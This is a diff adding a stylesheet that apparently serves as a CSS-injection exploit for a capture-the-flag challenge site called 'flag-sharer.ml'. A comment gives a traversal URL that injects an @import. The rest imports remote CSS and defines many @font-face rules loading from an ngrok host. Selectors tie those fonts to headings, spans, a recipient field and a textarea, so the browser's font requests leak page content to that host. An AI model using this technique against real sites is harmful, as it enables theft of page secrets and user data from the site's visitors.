@@ -1,0 +1,103 @@
+/* https://flag-sharer.ml/gifts?error=../item%3Fname=@import%2520%2527https://a22c2da74489.ngrok.io/start%253F2%2527;textarea%257Bdisplay%253Ablock%2520%2521important%257D%23 */
+
+@import url(https://a22c2da74489.ngrok.io/import2.css);
+
+@font-face {
+	font-family: "hackzzz";
+	src: url(https://a22c2da74489.ngrok.io/f/zzz)
+}
+
+@font-face {
+	font-family: "hackida";
+	src: url(https://a22c2da74489.ngrok.io/f/ida)
+}
+@font-face {
+	font-family: "hackidb";
+	src: url(https://a22c2da74489.ngrok.io/f/idb)
+}
+@font-face {
+	font-family: "hackidc";
+	src: url(https://a22c2da74489.ngrok.io/f/idc)
+}
+@font-face {
+	font-family: "hackidd";
+	src: url(https://a22c2da74489.ngrok.io/f/idd)
+}
+@font-face {
+	font-family: "hackide";
+	src: url(https://a22c2da74489.ngrok.io/f/ide)
+}
+@font-face {
+	font-family: "hackidf";
+	src: url(https://a22c2da74489.ngrok.io/f/idf)
+}
+@font-face {
+	font-family: "hackid0";
+	src: url(https://a22c2da74489.ngrok.io/f/id0)
+}
+@font-face {
+	font-family: "hackid1";
+	src: url(https://a22c2da74489.ngrok.io/f/id1)
+}
+@font-face {
+	font-family: "hackid2";
+	src: url(https://a22c2da74489.ngrok.io/f/id2)
+}
+@font-face {
+	font-family: "hackid3";
+	src: url(https://a22c2da74489.ngrok.io/f/id3)
+}
+@font-face {
+	font-family: "hackid4";
+	src: url(https://a22c2da74489.ngrok.io/f/id4)
+}
+@font-face {
+	font-family: "hackid5";
+	src: url(https://a22c2da74489.ngrok.io/f/id5)
+}
+@font-face {
+	font-family: "hackid6";
+	src: url(https://a22c2da74489.ngrok.io/f/id6)
+}
+@font-face {
+	font-family: "hackid7";
+	src: url(https://a22c2da74489.ngrok.io/f/id7)
+}
+@font-face {
+	font-family: "hackid8";
+	src: url(https://a22c2da74489.ngrok.io/f/id8)
+}
+@font-face {
+	font-family: "hackid9";
+	src: url(https://a22c2da74489.ngrok.io/f/id9)
+}
+
+li:first-of-type textarea:nth-of-type(2) {
+	display: block!important;
+	white-space: nowrap;
+	width: 80px;
+	height: 40px;
+	font-family: "hackzzz"
+}
+
+li:first-of-type textarea:nth-of-type(2)::-webkit-scrollbar {
+	background: #00f
+}
+
+
+h2 {font-family: "hackida"}
+h2::after {font-family: "hackidb"; content: "a"}
+h2::before {font-family: "hackidc"; content: "b"}
+h2::first-letter {font-family: "hackidd"}
+h3 {font-family: "hackide"}
+h3::after {font-family: "hackidf"; content: "a"}
+h3::before {font-family: "hackid1"; content: "a"}
+h3::first-letter {font-family: "hackid2"}
+ul:first-of-type li:first-of-type > span:first-of-type {font-family: "hackid3"}
+ul:first-of-type li:first-of-type > span:first-of-type::before {font-family: "hackid4"; content:"a"}
+ul:first-of-type li:first-of-type > span:first-of-type::after {font-family: "hackid5"; content:"a"}
+input[name=recipient] {font-family: "hackid6" }
+ul:first-of-type li:first-of-type > form > span {font-family: "hackid7"}
+ul:first-of-type li:first-of-type > form > span::before {font-family: "hackid8"; content:"a"}
+ul:first-of-type li:first-of-type > form > span::after {font-family: "hackid9"; content:"a"}
+span.error {font-family: "hackid0";}
